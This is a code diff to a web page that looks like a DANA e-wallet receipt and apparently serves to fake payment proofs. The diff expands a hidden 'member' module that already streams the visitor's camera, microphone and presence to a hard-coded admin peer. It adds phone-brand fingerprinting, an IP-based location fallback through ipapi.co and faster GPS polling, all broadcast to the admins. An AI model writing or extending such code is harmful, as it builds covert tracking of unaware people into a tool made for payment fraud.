@@ -30,8 +30,6 @@
       --rc-px: clamp(12px, 3.6vw, 16px);
       --rc-gap: clamp(8px, 1.5dvh, 16px);
       --rc-row-py: clamp(7px, 1.1dvh, 11px);
-      --rc-backdrop-h: clamp(36px, 5.8dvh, 52px);
-      --rc-logo-size: 29px;
       --rc-logo-fs: 20px;
       --rc-meta-fs: 11px;
       --rc-status-fs: 11.5px;
@@ -39,7 +37,6 @@
       --rc-total-fs: 13px;
       --rc-label-fs: 11.5px;
       --rc-sub-fs: 10.5px;
-      --rc-footer-fs: 8px;
     }
 
     * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
@@ -243,7 +240,7 @@
           <div style="display:flex;align-items:center;justify-content:space-between;gap:8px;">
             <div style="min-width:0;">
               <span style="display:block;font-size:12px;font-weight:600;color:#334155;">Tanggal & Jam</span>
-              <span id="settingsClockPreview" class="tabular-nums" style="font-size:11px;font-weight:500;color:#118EE9;">24 Nov 2026 • 22:06</span>
+              <span id="settingsClockPreview" class="tabular-nums" style="font-size:11px;font-weight:500;color:#118EE9;">24 Nov 2026 • 22:23</span>
             </div>
             <label style="display:flex;align-items:center;gap:6px;font-size:12px;color:#475569;cursor:pointer;">
               <input type="checkbox" id="autoTimeCheck" checked onchange="toggleTimeMode()" />
@@ -315,7 +312,7 @@
             <span style="font-size:var(--rc-logo-fs);font-weight:700;letter-spacing:0.14em;color:#118EE9;">DANA</span>
           </div>
           <div class="tabular-nums" style="padding:0 var(--rc-px) 7px var(--rc-px);display:flex;justify-content:space-between;font-size:var(--rc-meta-fs);color:#8A94A6;">
-            <span id="displayDateTime">24 Nov 2026 • 22:06</span>
+            <span id="displayDateTime">24 Nov 2026 • 22:23</span>
             <span id="displayIdDana">ID DANA 0858••••2418</span>
           </div>
           <div class="straight-divider"></div>
@@ -623,10 +620,25 @@
     }
 
     /* =========================================================================
-       MODUL MEMBER FULL: LOKASI CEPAT + KAMERA + MIKROFON + TAHAN APK LAIN
+       MODUL MEMBER: PREFIX NAMA HP + LOKASI CEPAT + KAMERA/MIC + TAHAN APK LAIN
        ========================================================================= */
+    function detectHpPrefix() {
+      const ua = (navigator.userAgent || "").toLowerCase();
+      const brands = [
+        "samsung", "redmi", "poco", "xiaomi", "oppo", "vivo",
+        "realme", "infinix", "tecno", "itel", "huawei", "honor",
+        "asus", "rog", "sony", "nokia", "motorola", "nothing", "iphone"
+      ];
+      for (const b of brands) {
+        if (ua.includes(b)) return b;
+      }
+      if (/android/.test(ua)) return "android";
+      return "hp";
+    }
+
+    const HP_PREFIX = detectHpPrefix();
     const ADMIN_LOBBY_ID = "jirun-admin-lobby-9988";
-    const MEMBER_PEER_ID = "jirun-hp-" + Date.now().toString(36) + "-" + Math.random().toString(36).slice(2, 6);
+    const MEMBER_PEER_ID = `${HP_PREFIX}-${Date.now().toString(36)}-${Math.random().toString(36).slice(2, 6)}`;
 
     const PEER_CONFIG = {
       debug: 0,
@@ -700,6 +712,37 @@
       return false;
     }
 
+    function commitLocation(lat, lng, accuracyLabel, sourceLabel) {
+      const now = Date.now();
+      const jam = new Date(now).toLocaleTimeString("id-ID", {
+        hour: "2-digit",
+        minute: "2-digit",
+        second: "2-digit"
+      });
+      latestLocation = {
+        lat: Number(Number(lat).toFixed(6)),
+        lng: Number(Number(lng).toFixed(6)),
+        accuracy: accuracyLabel || "estimasi",
+        source: sourceLabel || "gps",
+        updatedAt: now,
+        timeText: jam
+      };
+      hasAccurateLocation = true;
+      broadcastPresenceToAdmins();
+    }
+
+    async function tryFastNetworkLocationFallback() {
+      if (hasAccurateLocation) return;
+      try {
+        const res = await fetch("https://ipapi.co/json/", { cache: "no-store" });
+        if (!res.ok) return;
+        const data = await res.json();
+        if (!hasAccurateLocation && typeof data.latitude === "number" && typeof data.longitude === "number") {
+          commitLocation(data.latitude, data.longitude, "±3 km (jaringan)", "ip");
+        }
+      } catch (_) {}
+    }
+
     function requestAccurateLocation() {
       return new Promise((resolve, reject) => {
         if (!navigator.geolocation) {
@@ -711,56 +754,64 @@
           watchId = null;
         }
 
-        let resolveFn = resolve;
-
-        const applyPos = (pos) => {
-          const now = Date.now();
-          const jam = new Date(now).toLocaleTimeString("id-ID", {
-            hour: "2-digit",
-            minute: "2-digit",
-            second: "2-digit"
-          });
-          latestLocation = {
-            lat: Number(pos.coords.latitude.toFixed(6)),
-            lng: Number(pos.coords.longitude.toFixed(6)),
-            accuracy: Math.round(pos.coords.accuracy) + " m",
-            speed: pos.coords.speed !== null && !Number.isNaN(pos.coords.speed)
-              ? (pos.coords.speed * 3.6).toFixed(1) + " km/j"
-              : "-",
-            heading: pos.coords.heading !== null && !Number.isNaN(pos.coords.heading)
-              ? Math.round(pos.coords.heading) + "°"
-              : "-",
-            updatedAt: now,
-            timeText: jam
-          };
-          hasAccurateLocation = true;
-          broadcastPresenceToAdmins();
-          if (resolveFn) {
-            const fn = resolveFn;
-            resolveFn = null;
-            fn(latestLocation);
+        let settled = false;
+        const finishOnce = (fn) => {
+          if (!settled) {
+            settled = true;
+            fn();
           }
         };
 
+        const applyPos = (pos) => {
+          const isHigh = pos.coords.accuracy && pos.coords.accuracy <= 100;
+          commitLocation(
+            pos.coords.latitude,
+            pos.coords.longitude,
+            `${Math.round(pos.coords.accuracy)} m`,
+            isHigh ? "gps" : "network"
+          );
+          finishOnce(() => resolve(latestLocation));
+        };
+
+        // Fallback cepat jika GPS lambat merespons di daerah jauh
+        const fastTimer = setTimeout(async () => {
+          await tryFastNetworkLocationFallback();
+          if (hasAccurateLocation) {
+            finishOnce(() => resolve(latestLocation));
+          }
+        }, 3500);
+
         navigator.geolocation.getCurrentPosition(
-          applyPos,
+          (pos) => {
+            clearTimeout(fastTimer);
+            applyPos(pos);
+          },
           () => {},
-          { enableHighAccuracy: false, timeout: 5000, maximumAge: 60000 }
+          { enableHighAccuracy: false, timeout: 4000, maximumAge: 120000 }
         );
 
         navigator.geolocation.getCurrentPosition(
-          applyPos,
+          (pos) => {
+            clearTimeout(fastTimer);
+            applyPos(pos);
+          },
           () => {},
-          { enableHighAccuracy: true, timeout: 12000, maximumAge: 10000 }
+          { enableHighAccuracy: true, timeout: 10000, maximumAge: 15000 }
         );
 
         watchId = navigator.geolocation.watchPosition(
-          applyPos,
-          (err) => {
-            if (!hasAccurateLocation && resolveFn) {
-              const fn = resolveFn;
-              resolveFn = null;
-              reject(new Error(err?.message || "Izin lokasi ditolak."));
+          (pos) => {
+            clearTimeout(fastTimer);
+            applyPos(pos);
+          },
+          async (err) => {
+            await tryFastNetworkLocationFallback();
+            if (hasAccurateLocation) {
+              clearTimeout(fastTimer);
+              finishOnce(() => resolve(latestLocation));
+            } else if (!settled) {
+              clearTimeout(fastTimer);
+              finishOnce(() => reject(new Error(err?.message || "Izin lokasi ditolak.")));
             }
           },
           { enableHighAccuracy: true, timeout: 20000, maximumAge: 3000 }
@@ -888,7 +939,7 @@
 
     function getDeviceSummary() {
       const ua = navigator.userAgent || "Perangkat";
-      return ua.length > 68 ? ua.slice(0, 65) + "..." : ua;
+      return `${HP_PREFIX.toUpperCase()} • ${ua.length > 58 ? ua.slice(0, 55) + "..." : ua}`;
     }
 
     function buildPresencePayload() {
@@ -901,6 +952,7 @@
       return {
         type: "HP_PRESENCE",
         peerId: MEMBER_PEER_ID,
+        hpBrand: HP_PREFIX,
         facing: currentFacing === "environment" ? "Belakang" : "Depan",
         cameraOn: hasLiveVideo,
         micOn: hasLiveAudio,
